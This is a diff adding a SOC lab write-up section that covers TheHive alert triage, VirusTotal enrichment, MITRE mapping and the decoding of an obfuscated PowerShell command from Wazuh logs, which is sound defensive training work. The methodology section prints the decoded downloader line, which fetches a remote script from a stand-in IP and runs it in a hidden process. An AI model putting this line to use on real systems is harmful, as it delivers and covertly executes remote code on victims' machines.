@@ -59,3 +59,85 @@ Screenshots of each confirmed answer and the corresponding terminal output are i
 - Multiple concurrent intrusions can co-exist in one environment — a "loud" low-skill actor can mask a quieter, more capable one.
 - Alert correlation across disparate log sources (web app auth, Sysmon, LDAP, file share access) is what actually surfaces the full picture.
 - Narrative/report details from earlier in an incident (e.g. a C2 IP mentioned in the write-up) should never be assumed to apply to later events without re-verifying against the actual logs — this investigation surfaced two distinct attacker-controlled IPs, not one.
+
+## Skills Assessment — SOC Triage & Threat Intel Enrichment
+
+A follow-on exercise in the same module, working as a junior incident responder inside **TheHive** (SOC case management platform) against a live target (`ACADEMY-INCIDENT-HIVE`). Scope: triage and link the InsightNexus-specific alerts into a case, enrich findings via VirusTotal OSINT, map activity to MITRE ATT&CK, and deobfuscate a malicious PowerShell command recovered from a second Wazuh export (`logs-wazuh.zip`).
+
+### Environment
+
+| Asset | Role |
+|---|---|
+| `ACADEMY-INCIDENT-HIVE` (port 9000) | TheHive 5.2.15-3 instance, pre-loaded with 43 alerts |
+| VirusTotal (Community account) | OSINT enrichment on IOCs surfaced in TheHive |
+| MITRE ATT&CK (attack.mitre.org) | Technique lookup/confirmation |
+| `logs-wazuh.json` | Second Wazuh export containing an obfuscated PowerShell downloader event |
+
+### Task 1 — Case Creation & Alert Triage
+
+Out of 43 total alerts in the instance, filtering by tag/title for `InsightNexus` narrows the list to exactly 2 alerts relevant to this scenario:
+
+- `INX-ALERT-2025-00077` — "[InsightNexus] Admin Login via ManageEngine Web Console"
+- `INX-WAZUH-2025-00080` — "[InsightNexus] Hacker tool Mimikatz was detected"
+
+An empty case (`Insight Nexus Breach Investigation`) was created and both alerts were merged into it — the ManageEngine alert imported first, the Mimikatz alert merged in second via "Merge alert(s) into case."
+
+### Task 2/3 — Enrichment & Validating the netstat Finding
+
+The ManageEngine alert's comments contain analyst-captured `netstat -ano` output showing two external `ESTABLISHED` connections surviving a domain rejoin:
+
+- `198.51.100.24:443`
+- `203.0.113.18:4444` (port 4444 — classic Metasploit/reverse-shell default, immediately suspicious)
+
+Both IPs were pivoted into VirusTotal for enrichment (see Findings below), and the results were added back as a comment on the alert — closing the loop from raw evidence to OSINT lookup to documented finding.
+
+### Findings
+
+| # | Question | Answer | Evidence |
+|---|---|---|---|
+| 1 | VT "Files Referring" filename on `203.0.113.18` | `MangoJava.exe` | VT Relations tab, Win32 EXE, 43/69 vendor detections |
+| 2 | VT Whois city for `198.51.100.24` | `Los Angeles` | VT Details → Whois Lookup (IANA registrant record — this address falls in RFC 5737's documentation-reserved range, not a real ISP allocation) |
+| 3 | MITRE technique for C2 tool transfer (file download from C2) | `T1105` — Ingress Tool Transfer | attack.mitre.org |
+| 4 | MITRE technique for TheHive rule `92153` (VaultCli.dll / credential vault access) | `T1555` — Credential Access from Password Stores | TheHive alert "Suspicious process loaded VaultCli.dll module" |
+| 5 | Suspicious IP in decoded PowerShell command (`logs-wazuh.json`) | `198.51.100.24` | Decoded `-EncodedCommand` payload — same IP as Q2 |
+| 6 | User who executed the suspicious PowerShell command | `CORP\svc-update` | `eventdata.User` field, same Sysmon event |
+
+Screenshots of TheHive triage, VirusTotal lookups, MITRE research, and the PowerShell decode are in [`screenshots/`](./screenshots).
+
+### Methodology — Decoding the PowerShell Command
+
+`logs-wazuh.json` (31 events) was filtered directly for the keyword `EncodedCommand`:
+
+```bash
+jq -r '.[] | select(tostring | test("EncodedCommand")) | ._source.data.win.eventdata.CommandLine' logs-wazuh.json
+```
+
+This isolates a single Sysmon Event ID 1 alert (Wazuh rule `34012`, level 12): "Suspicious PowerShell execution with EncodedCommand (possible downloader/obfuscation)", flagged for the combination of `-EncodedCommand`, `-ExecutionPolicy Bypass`, and `-WindowStyle Hidden` — a textbook obfuscated-downloader pattern.
+
+The Base64 payload was extracted and decoded:
+
+```bash
+jq -r '.[] | select(tostring | test("EncodedCommand")) | ._source.data.win.eventdata.CommandLine' logs-wazuh.json | grep -oP '(?<=-EncodedCommand )\S+' | base64 -d
+```
+
+Note: PowerShell's native `-EncodedCommand` is normally Base64-of-UTF-16LE, which requires piping through `iconv -f UTF-16LE -t UTF-8`. The first decode attempt assumed this and produced garbled/mojibake output. Inspecting the raw decoded bytes with `xxd` showed plain ASCII with no interleaved null bytes — this payload was Base64-encoded from plain text directly, so decoding with `base64 -d` alone (no `iconv`) produced the correct result:
+
+```
+IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.24/defender/deploy-definitions.ps1'); Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'
+```
+
+A classic in-memory downloader/dropper: `IEX` pulls a remote script via `WebClient.DownloadString` (disguised with an antivirus-update-sounding filename), which then re-launches a second hidden PowerShell process to execute the payload from disk. The IP (`198.51.100.24`) matches the address enriched in Question 2, tying the delivery mechanism to the same attacker infrastructure identified via VirusTotal.
+
+### MITRE ATT&CK Mapping — Skills Assessment
+
+| Tactic | Technique | Evidence |
+|---|---|---|
+| Credential Access | T1003.001 – LSASS Memory | Mimikatz alert tags in TheHive |
+| Credential Access | T1555 – Credential Access from Password Stores | VaultCli.dll alert (rule 92153) |
+| Command & Control | T1105 – Ingress Tool Transfer | PowerShell `WebClient.DownloadString` from `198.51.100.24` |
+
+### Lessons Learned — Skills Assessment
+
+- A rule ID (e.g. TheHive rule `92153`) is often a faster, more reliable search key in a large alert list than free-text search, which may not index every field.
+- Never assume PowerShell's `-EncodedCommand` encoding without checking — a raw `xxd` byte inspection is the fastest way to confirm UTF-16LE vs. plain-text Base64 before committing to a decode method.
+- OSINT lookups (VirusTotal) and log-derived IOCs (the PowerShell C2 IP) corroborated each other independently — the same `198.51.100.24` surfaced from two unrelated evidence sources, strong confirmation it's genuine attacker infrastructure rather than noise.
